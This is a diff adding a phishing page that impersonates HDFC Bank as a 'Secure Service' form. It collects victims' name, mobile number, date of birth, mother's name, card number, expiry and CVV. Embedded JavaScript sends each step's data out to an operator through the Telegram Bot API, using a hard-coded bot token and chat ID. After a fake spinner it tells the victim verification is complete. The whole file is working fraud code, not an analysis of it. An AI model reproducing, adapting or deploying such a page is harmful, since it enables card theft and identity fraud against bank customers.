@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Secure HDFC Service</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f1f6fb;
+        margin: 0;
+        padding: 0;
+    }
+    /* Header */
+    .header {
+        background-color: white;
+        padding: 10px;
+        text-align: center;
+        border-bottom: 1px solid #ccc;
+        position: sticky;
+        top: 0;
+        z-index: 10;
+    }
+    .header img {
+        max-height: 50px;
+    }
+    .container {
+        max-width: 400px;
+        background: #fff;
+        margin: 20px auto;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+        text-align: center;
+        margin-bottom: 20px;
+        color: #004080;
+    }
+    label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+    }
+    input, select, button {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 14px;
+    }
+    .row {
+        display: flex;
+        gap: 10px;
+    }
+    .row input {
+        flex: 1;
+    }
+    button {
+        background-color: #004080;
+        color: white;
+        cursor: pointer;
+        border: none;
+    }
+    button:hover {
+        background-color: #0066cc;
+    }
+    /* Loader overlay */
+    .overlay {
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0,0,0,0.5);
+        z-index: 999;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        color: white;
+        font-size: 18px;
+    }
+    .spinner {
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid #ffffff;
+        border-radius: 50%;
+        width: 40px; height: 40px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 15px;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg);}
+        100% { transform: rotate(360deg);}
+    }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <img src="HDFC_Bank_Logo.png" alt="HDFC Bank Logo">
+</div>
+
+<div class="container" id="step1">
+    <h2>🔒 Secure Service</h2>
+    <label>Full Name</label>
+    <input type="text" id="fullName" required>
+
+    <label>Registered Mobile No.</label>
+    <input type="tel" id="mobile" maxlength="13" required>
+
+    <label>Date of Birth</label>
+    <input type="text" id="dob" required oninput="formatDOB(this)">
+
+    <label>Mother's Name</label>
+    <input type="text" id="motherName" required>
+
+    <label>Select Service</label>
+    <select id="service" required>
+        <option value="">--Select--</option>
+        <option>KYC Update</option>
+        <option>New Credit Card Apply</option>
+        <option>Card Blocked</option>
+        <option>Card Unlocked</option>
+        <option>Other Granted Card</option>
+        <option>Other Services</option>
+    </select>
+
+    <button onclick="submitStep1()">Next</button>
+</div>
+
+<div class="container" id="step2" style="display:none;">
+    <h2>🔒 Secure Verification</h2>
+    <label>16 Digit Card Number</label>
+    <input type="text" id="cardNumber" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required>
+
+    <div class="row">
+        <div>
+            <label>Expiry Date</label>
+            <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" required>
+        </div>
+        <div>
+            <label>CVV</label>
+            <input type="password" id="cvv" maxlength="3" required>
+        </div>
+    </div>
+
+    <button onclick="submitStep2()">Submit</button>
+</div>
+
+<div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    Please wait — Checking your details...
+</div>
+
+<script>
+    const BOT_TOKEN = "8353007176:AAGsexdDdHiNLNMSkRFDCe5VKWMRCFGBgRY";
+    const CHAT_ID = "7155441629";
+
+    function sendToTelegram(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    }
+
+    function submitStep1() {
+        const fullName = document.getElementById("fullName").value.trim();
+        const mobile = document.getElementById("mobile").value.trim();
+        const dob = document.getElementById("dob").value;
+        const motherName = document.getElementById("motherName").value.trim();
+        const service = document.getElementById("service").value;
+
+        if(!fullName || !mobile || !dob || !motherName || !service) {
+            alert("Please fill all fields");
+            return;
+        }
+
+        sendToTelegram(`Step 1 Data:\nName: ${fullName}\nMobile: ${mobile}\nDOB: ${dob}\nMother: ${motherName}\nService: ${service}`);
+
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+    }
+
+    function submitStep2() {
+        const cardNumber = document.getElementById("cardNumber").value.trim();
+        const expiry = document.getElementById("expiry").value.trim();
+        const cvv = document.getElementById("cvv").value.trim();
+
+        if(cardNumber.length !== 19 || expiry.length !== 5 || cvv.length !== 3) {
+            alert("Please fill valid card details");
+            return;
+        }
+
+        sendToTelegram(`Step 2 Data:\nCard Number: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}`);
+
+        document.getElementById("overlay").style.display = "flex";
+        setTimeout(() => {
+            document.getElementById("overlay").style.display = "none";
+            alert("Verification complete.");
+        }, 3000);
+    }
+
+    // Auto formatting for card & expiry
+    document.getElementById("cardNumber").addEventListener("input", function(e) {
+        let value = e.target.value.replace(/\D/g, "").substring(0,16);
+        e.target.value = value.replace(/(.{4})/g, "$1 ").trim();
+    });
+    document.getElementById("expiry").addEventListener("input", function(e) {
+        let value = e.target.value.replace(/\D/g, "").substring(0,4);
+        if(value.length >= 3) {
+            value = value.substring(0,2) + "/" + value.substring(2,4);
+        }
+        e.target.value = value;
+    });
+    
+    function formatDOB(input) {
+      let value = input.value.replace(/[^0-9]/g, '');
+
+      // Ensure format step by step
+      if (value.length > 2 && value.length <= 4) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      } else if (value.length > 4) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
+      } else if (value.length === 2) {
+        value = value + '/';
+      }
+
+      input.value = value;
+    }
+</script>
+</body>
+</html>
